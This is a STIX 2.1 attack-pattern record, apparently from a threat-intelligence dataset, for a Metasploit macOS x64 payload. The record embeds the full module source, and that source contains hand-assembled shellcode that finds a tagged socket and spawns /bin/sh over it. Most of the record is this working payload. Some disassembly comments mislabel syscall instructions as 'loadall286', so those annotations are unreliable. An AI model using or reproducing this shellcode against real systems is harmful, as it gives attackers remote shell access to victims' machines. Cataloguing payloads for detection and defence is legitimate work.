{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b1eb874b-7017-416b-b66f-d1f2f6f9b13e",
    "created": "2024-08-14T16:33:19.360065Z",
    "modified": "2024-08-14T16:33:19.360068Z",
    "name": "OSX Command Shell, Find Tag Inline",
    "description": "Spawn a shell on an established connection (proxy/nat safe)",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/osx/x64/shell_find_tag.rb",
            "external_id": "shell_find_tag.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nmodule MetasploitModule\n\n  CachedSize = 107\n\n  include Msf::Payload::Single\n  include Msf::Payload::Osx\n  include Msf::Sessions::CommandShellOptions\n\n  def initialize(info = {})\n    super(merge_info(info,\n      'Name'          => 'OSX Command Shell, Find Tag Inline',\n      'Description'   => 'Spawn a shell on an established connection (proxy/nat safe)',\n      'Author'        => 'nemo <nemo[at]felinemenace.org>',\n      'License'       => MSF_LICENSE,\n      'Platform'      => 'osx',\n      'Arch'          => ARCH_X64,\n      'Handler'       => Msf::Handler::FindTag,\n      'Session'       => Msf::Sessions::CommandShellUnix\n\n      ))\n      # exec payload options\n      register_options(\n        [\n          OptString.new('CMD',  [ true,  \"The command string to execute\", \"/bin/sh\" ]),\n          OptString.new('TAG',  [ true,  \"The tag to test for\", \"NEMO\" ]),\n      ])\n  end\n\n  #\n  # ensures the setting of tag to a four byte value\n  #\n  def generate(_opts = {})\n    cmd  = (datastore['CMD'] || '') + \"\\x00\"\n    call = \"\\xe8\" + [cmd.length].pack('V')\n\n    payload =\n      \"\\x48\\x31\\xFF\" +                    # xor rdi,rdi\n      \"\\x57\" +                            # push rdi\n      \"\\x48\\x89\\xE6\" +                    # mov rsi,rsp\n      \"\\x6A\\x04\" +                        # push byte +0x4\n      \"\\x5A\" +                            # pop rdx\n      \"\\x48\\x8D\\x4A\\xFE\" +                # lea rcx,[rdx-0x2]\n      \"\\x4D\\x31\\xC0\" +                    # xor r8,r8\n      \"\\x4D\\x31\\xC9\" +                    # xor r9,r9\n      \"\\x48\\xFF\\xCF\" +                    # dec rdi\n      \"\\x48\\xFF\\xC7\" +                    # inc rdi\n      \"\\xB8\\x1D\\x00\\x00\\x02\" +            # mov eax,0x200001d\n      \"\\x0F\\x05\" +                        # loadall286\n      \"\\x81\\x3C\\x24\" +                    # cmp dword [rsp],0x4e454d4f\n      datastore['TAG'] +\n      \"\\x75\\xED\" +                        # jnz 0x17\n      \"\\x48\\x31\\xC9\" +                    # xor rcx,rcx\n      \"\\xB8\\x1D\\x00\\x00\\x02\" +            # mov eax,0x200001d\n      \"\\x0F\\x05\" +                        # loadall286\n      \"\\xB8\\x5A\\x00\\x00\\x02\" +            # mov eax,0x200005a\n      \"\\x48\\x31\\xF6\" +                    # xor rsi,rsi\n      \"\\x0F\\x05\" +                        # loadall286\n      \"\\xB8\\x5A\\x00\\x00\\x02\" +            # mov eax,0x200005a\n      \"\\x48\\xFF\\xC6\" +                    # inc rsi\n      \"\\x0F\\x05\" +                        # loadall286\n      \"\\x48\\x31\\xC0\" +                    # xor rax,rax\n      \"\\xB8\\x3B\\x00\\x00\\x02\" +            # mov eax,0x200003b\n      call +\n      cmd +\n      \"\\x48\\x8B\\x3C\\x24\" +                # mov rdi,[rsp]\n      \"\\x48\\x31\\xD2\" +                    # xor rdx,rdx\n      \"\\x52\" +                            # push rdx\n      \"\\x57\" +                            # push rdi\n      \"\\x48\\x89\\xE6\" +                    # mov rsi,rsp\n      \"\\x0F\\x05\"                          # loadall286\n  end\nend\n",
    "x_mitre_platforms": [
        "osx'"
    ]
}